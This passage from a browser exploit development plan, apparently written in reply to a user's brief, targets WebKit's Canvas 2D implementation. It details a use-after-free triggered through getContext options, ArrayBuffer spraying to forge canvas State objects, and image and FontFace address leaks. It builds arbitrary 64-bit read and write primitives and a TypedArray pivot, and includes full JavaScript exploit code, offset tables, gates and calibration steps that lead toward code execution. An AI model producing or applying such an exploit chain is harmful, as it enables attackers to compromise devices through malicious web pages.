**Why this works without a vtable:** `setLineDash` is a non-virtual member; the only virtual call is `m_canvas->drawingContext()`, and `m_canvas` is a real canvas. `getLineDash` is non-virtual. `realizeSaves()` is a no-op at count 0. The zero CRC2D vptr is never dereferenced.

**Why the values pass validation:** `lineDashSequenceIsValid` requires `std::isfinite(d) && d >= 0`. A positive heap pointer is a positive subnormal (finite, `>= 0`), and a positive subnormal double for size/capacity is also finite and `>= 0`. `Vector<double>::operator=` is a bitwise `movsd` copy; it does not normalize the subnormal. **Do not** XOR the pointer for this path; the destination must contain the exact pointer bits.

### 6.4 `m_canvas` is phase-dependent (correction to the brief)

The brief says “`m_canvas` at +32 must be NULL (GC visitChildren safety)”. That is correct for the **getter/GC** phase but **fatal for the write phase**:

- `CanvasRenderingContext::canvasBase()` returns `m_canvas` by reference.
- `drawingContext()` calls `canvasBase().drawingContext()` — a virtual call through `m_canvas`'s vtable.
- If `m_canvas == 0`, the call loads a vtable from address 0 → SIGSEGV. `applyLineDash()` calls `drawingContext()` **after** the copy, so the write lands but the process dies immediately; that is not a usable primitive.
- `m_usesDisplayListDrawing` false is the default; the display-list branch (`if (!m_recordingContext) ... return &m_recordingContext->context();`) would bypass `m_canvas` only if `m_recordingContext` is non-null and valid, which we cannot arrange before the first write.

Therefore:

| Phase | `m_canvas` (+32) | Reason |
|---|---|---|
| Getter proof / read / scans | `0` | GC-safe, no setter deref |
| Stage A/B/C write | `canvas_ptr` | `drawingContext()` virtual call must hit a real canvas |
| After the write, if GC is a concern | restore `0` | optional; non-null is also GC-safe (hash insert) |

`addOpaqueRoot(nullptr)` returns false without dereferencing; `addOpaqueRoot(canvas_ptr)` hashes the pointer without dereferencing. Both are GC-safe. The real constraint is the setter dereference, not GC.

### 6.5 Write verification and target choice

First write target: a **BSS scratch address** (the same writable segment, a slot not used by stage A/B). Write `0x1122334455667788` and read it back with `read64`. Only after that passes should you target a JSCell field.

Do not target `m_unrealizedSaveCount` or `m_canvas` with the first write: a wrong value there turns a recoverable failure into a crash.

### 6.6 DAZ / XOR note

- `setLineDash`'s validation compares each element to 0 and checks `isfinite`. Under DAZ, a positive subnormal is treated as `+0` for the comparison, so `>= 0` passes; the stored bits are untouched. A negative subnormal (sign bit 1) is `< 0` without DAZ and would be rejected; under DAZ it compares as `-0`, and `-0 < 0` is false, so it passes. Do not rely on the negative case until it is calibrated.
- The `XOR 0x4000000000000000` form is useful for *transporting* a pointer through code that performs FP arithmetic or normalization (it turns the subnormal into a normal double in `[2,4)`). It is **not** needed for the `Vector<double>` copy, which is bit-exact. If you use XOR on the write path, the destination receives the XORed value, so the target field must be un-XORed later or must expect the encoding.
- For reads, store the returned double into a `Float64Array` immediately. If a calibration read of a known heap pointer returns 0, the binding normalized the subnormal; in that case, use the XOR form where possible, or move the pointer extraction to the typed-array pivot as soon as it is available.

---

## 7. Phase 5 — TypedArray pivot (Q4)

### 7.1 JSC layout

Local tree (`JSArrayBufferView`):

| Cell offset | Size | Field |
|---:|---:|---|
| `+0` | 8 | JSCell header (StructureID / indexing type / type info) |
| `+8` | 8 | `JSNonFinalObject::m_butterfly` |
| `+16` | 8 | `Structure* m_structure` |
| `+24` | 8 | `m_vector` (`CagedPtr<Gigacage::Primitive, void>`) |
| `+32` | 8 | `m_length` (`size_t`) |
| `+40` | 8 | `m_byteOffset` |
| `+48` | 1 | `m_mode` (`TypedArrayMode`) |
| `+56` | 8 | `m_butterfly` (the view's own) |

Older JSC layouts put `m_vector` at `+16` and `m_length` at `+24`. **Calibrate both.** The user's earlier `+16/+24` is the older layout; the local tree is `+24/+32`. Do not hardcode one without a device gate.

### 7.2 Locate the cell

The FontFace leak gives a JSCell pointer `P_jsc` (`0x0000001000xxxxxx`). The MarkedSpace block is 16 KB aligned:

```
block = P_jsc & ~0x3FFFn
```

Read the 16 KB block with `read48` (≈342 calls). For each 16-byte-aligned offset `off`:

1. Candidate `m_vector = read64(block + off + 24)`; candidate `m_length = read64(block + off + 32)`.
2. If `m_length` is a small value (the length you created, e.g. 4) and `m_vector` is a plausible fastMalloc pointer, read `read64(m_vector)`.
3. Compare to the unique 8-byte marker you stored in every sprayed typed array (e.g. `0x1122334455667788`). If it matches, `cell = block + off`.

Also test the older layout (`+16/+24`) in the same pass. If the block does not contain a typed array, scan the adjacent committed blocks (verify the first `read64` of each block does not fault; if it faults, the block is uncommitted — abort that direction). Create the typed arrays **before** the FontFace leak so they share the MarkedSpace region.

### 7.3 Overwrite `m_vector` and `m_length`

With the cell known, `setLineDash` can write 16 bytes at `cell + 24`:

```js
// dashC[0] = doubleFromBits(T)       -> m_vector
// dashC[1] = doubleFromBits(0x1000)  -> m_length
```

This writes `m_vector = T` and `m_length = 0x1000` in one 16-byte write (the two doubles are adjacent at `+24` and `+32`). If the device layout is `+16/+24`, write at `cell + 16` instead.

Caveats:

- `m_vector` is a `CagedPtr`. With Gigacage OFF, the cage mask is 0, but a tag/PAC may remain. Write the raw pointer first; if `ta[0]` faults or reads the wrong address, try `T | tag` / `T & ~tag` with the tag observed from a known `m_vector` value. Calibrate with a known mapped target.
- `m_mode` at `+48` should remain `FastTypedArray` (`0x10`) for a small `new BigUint64Array(4)`. Do not touch it.
- `m_byteOffset` at `+40` should remain 0.
- Keep the typed array alive and do not trigger GC between the overwrite and the first use. GC does not trace the raw `m_vector`, but a moved/collected cell would ruin the pivot.

### 7.4 Verify

1. Write a known value to a BSS scratch address with stage C.
2. Pivot `m_vector` to that address, `m_length` to `0x1000`.
3. `ta[0]` must equal the known value. Then `ta[0] = 0xdeadbeef...` and `read64(scratch)` must reflect it.
4. From here, the typed array is a full 64-bit R/W primitive with no DAZ/NaN/subnormal restrictions. Use it for module `.text` reads, vtable/gadget discovery, and the code-execution phase.

---

## 8. Phase 6 — ASLR integration and ordering (Q5)

### 8.1 What each leak contributes

| Leak | Value | Use |
|---|---|---|
| APNG | `module_base = vtable_leak − 0x7850` | ELF parse → writable BSS `W`; later code pointers |
| APNG | heap candidates (`0x08..0x10`) | canvas vtable grouping; read anchors |
| FontFaceSet | JSCell pointer `P_jsc` (`0x10_xxxxxxxx`) | typed-array block scan; second read anchor |
| Mapped VA list | 10 fixed VAs | initial `m_buffer` for the getter proof |

The module base is **not** needed for the getters or the write copy; it is needed for `W` and for code execution. If the APNG module leak fails, use the deterministic 14.10 base, but validate the ELF magic before writing to BSS.

### 8.2 Forge timing

The AB is allocated after the UAF free. Fill it immediately with the leak-derived values:

- `m_stateStack.m_buffer`: initial mapped VA for the proof, then `W`/`B` for the write stages.
- `m_canvas`: `0` for the proof/read; `canvas_ptr` for the write stages.
- `m_unrealizedSaveCount`: `0` at `+600`.
- Tag at `+736` for AB identification.

Because the AB contents are mutable in place, no second UAF and no respray are needed for any later address change. This satisfies the “never >1 triggerUAF per page” constraint.

### 8.3 Page-load order (single page)

```
 1. Beacon pool (>=1200 images)
 2. Create 200+ canvases (no contexts), keep refs
 3. APNG load → draw → getImageData → scan
      → module_base, heap candidates, canvas candidates
 4. FontFaceSet UAF/leak → P_jsc (optional but recommended)
 5. Canvas UAF (bitmaprenderer outer + 2d inner via options defineProperty)
 6. AB(752) spray (N=128) + forge (m_buffer = mapped VA, m_canvas = 0)
 7. Getter proof (all-zero State signature)
 8. Read primitive: ELF parse → W; canvas grouping → canvas_ptr
 9. Set m_canvas = canvas_ptr in all ABs
10. Stage A + BSS-slot oracle → winner k and buffer B
11. Stage B → fake State at B; verify markers
12. Stage C → write to BSS scratch; verify
13. TypedArray pivot → full 64-bit R/W
14. (out of scope) module .text / ROP / kernel
```

### 8.4 Module base validation

```
read64(module_base) == 0x00010102464C457F   // ELF64 little-endian
read64(module_base + 0x20) = e_phoff
read64(module_base + 0x36) & 0xffff = e_phentsize
read64(module_base + 0x38) & 0xffff = e_phnum
```

Find `PT_LOAD` with `p_flags & 2` (write) and a large `p_memsz`; choose `W` near the end, 0x100-aligned. Verify `W` is zero before stage A. If the header check fails, do not write to a guessed base.

---

## 9. Complete pseudocode (single page)

```js
// ---------- constants ----------
const AB_SIZE = 752, N = 128;
const OFF_TRACER = 28, OFF_CANVAS = 32;
const OFF_BUF = 120, OFF_SIZE = 128, OFF_CAP = 132, OFF_SAVE = 600;
const INITIAL_VA = 0x800000000n;

const f64 = new Float64Array(1), u64 = new BigUint64Array(f64.buffer);
const scratch = new DataView(new ArrayBuffer(8));
function dbl(bits) { scratch.setBigUint64(0, bits, true); return scratch.getFloat64(0, true); }
function bitsOf(d) { scratch.setFloat64(0, d, true); return scratch.getBigUint64(0, true); }

// ---------- 1. leaks (APNG / FontFace) ----------
const { moduleBase, heapCandidates, canvasCandidates } = doApngLeak();
const pJsc = doFontFaceLeak();          // optional

// ---------- 2. UAF ----------
const oc = document.createElement('canvas');
oc.width = 1; oc.height = 1;
let stale = null;
const opts = {};
Object.defineProperty(opts, 'alpha', {
  configurable: true,
  get() { stale = oc.getContext('2d'); return true; }
});
oc.getContext('bitmaprenderer', opts);
if (!stale) return beacon('FAIL', 'no-stale');

// ---------- 3. spray + forge ----------
const abs = [], dvs = [];
for (let i = 0; i < N; i++) {
  const ab = new ArrayBuffer(AB_SIZE);
  const dv = new DataView(ab);
  dv.setUint8(OFF_TRACER, 0);
  dv.setBigUint64(OFF_CANVAS, 0n, true);
  dv.setBigUint64(OFF_BUF, INITIAL_VA, true);
  dv.setUint32(OFF_SIZE, 1, true);
  dv.setUint32(OFF_CAP, 1, true);
  dv.setUint32(OFF_SAVE, 0, true);
  dv.setBigUint64(736, 0x4142434445460000n | BigInt(i), true);
  dv.setBigUint64(744, 0xfeedfacecafebeefn, true);
  abs.push(ab); dvs.push(dv);
}

// ---------- 4. getter proof ----------
const lw = stale.lineWidth;
const ga = stale.globalAlpha;
const m  = stale.getTransform();
const dash = stale.getLineDash();
if (!(lw === 0 && ga === 0 && m.a === 0 && m.b === 0 && m.c === 0 &&
      m.d === 0 && m.e === 0 && m.f === 0 && dash.length === 0))
  return beacon('FAIL', 'not-zero-state');
beacon('PASS', 'zero-state');

// ---------- 5. read primitive ----------
function setBufAll(v) { for (const dv of dvs) dv.setBigUint64(OFF_BUF, v, true); }
function setBuf(i, v) { dvs[i].setBigUint64(OFF_BUF, v, true); }
function read64(A) { setBufAll(A - 48n); f64[0] = stale.lineWidth; return u64[0]; }
function read48(A) {
  setBufAll(A - 112n);
  const mm = stale.getTransform();
  f64[0]=mm.a; f64[1]=mm.b; f64[2]=mm.c; f64[3]=mm.d; f64[4]=mm.e; f64[5]=mm.f;
  return [u64[0],u64[1],u64[2],u64[3],u64[4],u64[5]];
}

// ELF validate + BSS W
if (read64(moduleBase) !== 0x00010102464C457Fn) return beacon('FAIL','elf');
const W = findWritableBss(moduleBase);   // reads phdrs, verifies zero
if (!W) return beacon('FAIL', 'no-bss');

// canvas grouping (read first word of each candidate, group by vtable)
const canvasPtr = pickCanvas(canvasCandidates, read64);
if (!canvasPtr) return beacon('FAIL', 'no-canvas');

// ---------- 6. write stages ----------
for (const dv of dvs) dv.setBigUint64(OFF_CANVAS, canvasPtr, true);

// stage A: distinct BSS slot per AB, one setLineDash
const slots = [];
for (let i = 0; i < N; i++) slots.push(W + 0x1000n + BigInt(i) * 0x100n);
for (let i = 0; i < N; i++) setBuf(i, slots[i]);
const dashA = new Array(64).fill(1);
stale.setLineDash(dashA);

// find winner k: the slot whose +168 vector returns 64 elements
let k = -1;
for (let i = 0; i < N; i++) {
  setBufAll(slots[i]);
  const a = stale.getLineDash();
  if (a.length === 64) { k = i; break; }
}
if (k < 0) return beacon('FAIL', 'no-slot');
beacon('PASS', 'winner-' + k);

// leak B from W_k+168
setBuf(k, slots[k] + 120n);
f64[0] = stale.lineWidth;
const B = u64[0];
if (!plausibleHeap(B)) return beacon('FAIL', 'no-B');

// stage B: fill B with the fake State (64 doubles)
const dashB = new Array(64).fill(0);
dashB[6]  = dbl(0x40934A0000000000n);  // 1234.5 marker (example)
dashB[7]  = dbl(0x3FE0000000000000n);  // 0.5
dashB[14] = 1; dashB[15] = 0; dashB[16] = 0;
dashB[17] = 1; dashB[18] = 0; dashB[19] = 0;
dashB[20] = dbl(1n);                    // hasInvertibleTransform byte = 1
dashB[21] = dbl(TARGET);                // lineDash.m_buffer = T
dashB[22] = dbl(0x0000000200000002n);   // size=2, capacity=2
dashB[23] = 0;
setBuf(k, slots[k]);
stale.setLineDash(dashB);

// switch to B and verify markers
setBuf(k, B);
if (stale.lineWidth !== 1234.5) return beacon('FAIL','stageB-lw');
const mm = stale.getTransform();
if (mm.a !== 1 || mm.d !== 1) return beacon('FAIL','stageB-tr');

// stage C: write 16 bytes to T
const dashC = [dbl(0x1122334455667788n), dbl(0n)];
stale.setLineDash(dashC);
if (read64(TARGET) !== 0x1122334455667788n) return beacon('FAIL','write');
beacon('PASS','write');
```

Notes:

- `dbl(0x40934A0000000000n)` is an example; compute the actual double bits for `1234.5` with the scratch DataView, or use a literal `1234.5` (both halves finite).
- `TARGET` must be a positive userland address whose double is finite and ≥ 0. Start with a BSS scratch address.
- After `setBuf(k, B)`, never call a setter that reads `S+168` before stage C unless you intend to change the target.
- If `getLineDash()` returns 64 elements for more than one `i`, the slots overlap or the AB array is inconsistent; abort.

---

## 10. Gates, beacons, abort conditions

| Gate | Beacon | Pass condition | If fail |
|---|---|---|---|
| G0 | `BOOT` | APIs present, beacon pool alive | abort |
| G1 | `APNG` | module base ELF-valid; ≥1 heap/canvas candidate | fallback base or abort |
| G2 | `UAF` | `stale` non-null | abort |
| G3 | `SPRAY` | `N` ABs + views alive | abort |
| G4 | `ZERO` | `lineWidth=0`, `alpha=0`, transform `[0,0,0,0,0,0]`, dash `[]` | abort (do not retry getters) |
| G5 | `READ` | `read64(moduleBase)` = ELF magic | abort |
| G6 | `BSS` | `W` zero and writable | try another segment / abort |
| G7 | `CANVAS` | vtable group with count ≥ 5 | block scan / abort |
| G8 | `WIN` | exactly one slot returns 64 dashes | abort |
| G9 | `B` | plausible heap pointer | abort |
| G10 | `STATE` | `lineWidth`/`globalAlpha`/transform markers match `dashB` | abort |
| G11 | `WRITE` | BSS scratch readback matches | abort |
| G12 | `PIVOT` | `ta[0]` reads the known value | abort |

Beacon messages must be short and must not allocate large strings. A missing beacon after a gate is the crash signal; do not interpret the last beacon as success.

---

## 11. Failure-mode matrix

| Symptom | Most likely cause | Distinguish by |
|---|---|---|
| Crash at first `lineWidth` | AB did not reclaim; `m_buffer` unmapped; `m_size == 0` | No `ZERO` beacon; check spray order/class, VA, `+128` order |
| `lineWidth == 1.0` | Inline State survived; `m_buffer` not overwritten | `ZERO` fail with finite values |
| `lineWidth == 0.0` but transform identity | Not the zero page; real State with `lineWidth=0` | `ZERO` transform check |
| Crash at `setLineDash` | `m_canvas == 0` or invalid; `m_unrealizedSaveCount != 0`; destination header invalid | Beacon before/after; check `+32`, `+600`, `W` writability |
| `setLineDash` returns without write | Dash validation failed (NaN/negative); `realizeSaves` appended; capacity < n | Check dash values, even length, capacity |
| Slot oracle never returns 64 | `W` not writable; canvas invalid; virtual call on zero vtable | Check `W` zero/readback; try a real canvas |
| Stage B markers wrong | `B` wrong; `dashB` didn't land; capacity < 64 | Read `W+168`; verify capacity |
| Stage C no write | `S+168` not `{T,2,2}`; capacity < 2; `T` not writable | Read `B+168..183`; verify `T` mapping |
| Typed array pivot faults | Wrong cell/offset; CagedPtr tag; wrong `m_length` | Try `+16/+24`; try tag variants; verify with a known page |

---

## 12. Calibration checklist / residual unknowns

1. **`+120` vs `+112`**: the getter proof is the discriminator. If `+120` crashes and `+112` works, the corrected offset is wrong for this build; record the result.
2. **`+128` size / `+132` capacity vs swapped**: the device order is `{ptr, size, capacity}` per the corrected inputs; the upstream tree is `{ptr, capacity, size}`. If `size=0` crashes, try the swap.
3. **`+600` saveCount**: derived from `+120 + 16 + 448 + 16`. If `save()` is used as an oracle, verify the increment at `+600`, not `+592`. Reset with `restore()` (decrements without `m_canvas`) or `DataView`.
4. **State stride 448 vs 400**: V767v2 measured `0x1C0`; keep `size=1` so it does not matter.
5. **`lineDash` field order**: `{ptr +168, size +176, cap +180}` per the device order. If `getLineDash` returns wrong lengths, try the swap.
6. **`setLineDash` virtual-call check**: confirm the console binding does not call `isContextLost()`/`is2d()` virtually on the context before the copy. If it does, install the real CRC2D vtable at `+0`/`+40` first (requires the vtable RVA) or use a different setter.
7. **Canvas vtable group**: validate on a probe with 200+ canvases and no UAF; the group count and the `m_context` null check must be stable before the full chain.
8. **`CagedPtr` tag**: calibrate `m_vector` writes with a known mapped target; try raw, `|tag`, `&~tag`.
9. **DAZ readback**: calibrate `read64` on a known heap pointer (e.g., the FontFace `m_wrapper`). If bits are lost, switch pointer extraction to the typed-array pivot as soon as possible.
10. **Module BSS writability**: verify `W` is zero and that a `setLineDash`-allocated vector header lands at `W+168` without a fault. If the BSS is too small for 128 slots, reduce `N` to 32–64.

---

## 12.5 Source anchors (local WebKit tree)

| Claim | Source |
|---|---|
| `state()` = `m_stateStack.last()`; `modifiableState()` | `Source/WebCore/html/canvas/CanvasRenderingContext2DBase.h` |
| `State` member order (`lineWidth`, `globalAlpha`, `transform`, `lineDash`, `FontProxy`) | `CanvasRenderingContext2DBase.h`, `struct State` |
| `setLineDash` order: validate → `realizeSaves` → copy-assign → odd append → `applyLineDash` | `Source/WebCore/html/canvas/CanvasRenderingContext2DBase.cpp` |
| `realizeSavesLoop` calls `drawingContext()` and appends states | same file |
| `applyLineDash` calls `drawingContext()` and returns on null | same file |
| `drawingContext()` → `canvasBase().drawingContext()` (virtual on `m_canvas`) | same file |
| `getTransform()` = `DOMMatrix::create(state().transform.toTransformationMatrix(), Is2D::Yes)` | same file |
| `canvasBase()` returns `m_canvas` by reference; tracer bool member | `Source/WebCore/html/canvas/CanvasRenderingContext.h` |
| GC visitor only adds `wrapped().canvas()` as an opaque root | `Source/WebCore/bindings/js/JSCanvasRenderingContext2DCustom.cpp` |
| `addOpaqueRoot(nullptr)` returns false without deref | `Source/JavaScriptCore/heap/AbstractSlotVisitorInlines.h` |
| `VectorBufferBase::deallocateBuffer` nulls `m_buffer`/`m_capacity`, leaves `m_size` | `Source/WTF/wtf/Vector.h` |
| `Vector::operator=` in-place copy when `other.size() <= capacity()` | `Source/WTF/wtf/Vector.h` |
| `Vector::at()` overflow → `CrashOnOverflow` | `Source/WTF/wtf/Vector.h` |
| `JSArrayBufferView` member order (`m_vector`, `m_length`, `m_mode`) | `Source/JavaScriptCore/runtime/JSArrayBufferView.h` |

The `findWritableBss()` and `pickCanvas()` helpers in §9 are intentionally left as pseudocode; their contracts are in §5.3 and §5.5.

---

## 13. What changed vs. V871–V876 / chain v4–v5

| Item | Old | Corrected |
|---|---|---|
| Reclaim carrier | 748-char string (V871/V873/V874/V875/V876) | `ArrayBuffer(752)` + DataView |
| `m_stateStack` | `+112` | `+120` |
| `m_size` / `m_capacity` | `+120` / `+124` | `+128` / `+132` |
| `m_unrealizedSaveCount` | `+592` | `+600` (derived) |
| Save oracle | `save()` + scan `+592` | BSS-slot `getLineDash` oracle; `save()` optional |
| Write aim | `m_buffer = target − 168` | controlled State `S` with `{T,n,n}` at `S+168` |
| Controlled state | “point at a leaked heap pointer” (uncontrolled) | Vector-buffer two-stage at a known `B` |
| `m_canvas` | NULL everywhere | NULL for getters/GC; real canvas for setters |
| Path self-leak | `moveTo` on forged context | **Blocked by zero vtable** (`hasInvertibleTransform` virtual); not used |
| TypedArray offsets | `+16/+24` | `+24/+32` in the local tree; calibrate both |
| DAZ | “never Canvas float64” | Raw subnormal `setLineDash` is bit-exact; readback needs the immediate-Float64 store |

---

## 14. Bottom line

The getter pass is **not** proven by `0.0`; it is proven by the all-zero State signature (`lineWidth=0`, `alpha=0`, zero transform, empty dash). Once that passes, the live AB's `DataView` at `+120` is the read primitive: set `m_buffer = A − 48` and `lineWidth` reads `A`. The write primitive is **not** `m_buffer = target − 168`; it is a controlled State at a known address whose `+168` header is `{target, n, n}`. The missing controlled address is obtained without the AB address and without a CRC2D vtable by the Vector-buffer two-stage: `setLineDash` allocates a `Vector<double>` at a writable module-BSS slot, leaks its buffer pointer, fills it with the fake State, and then writes through it. The only hard prerequisites are a real `HTMLCanvasElement *` (for `drawingContext()`) and a writable BSS slot (from the module ELF), both of which come from the APNG leak. The TypedArray pivot then converts this into unrestricted 64-bit JavaScript R/W, which is the correct point to leave the Canvas2D segment and start the code-execution chain.
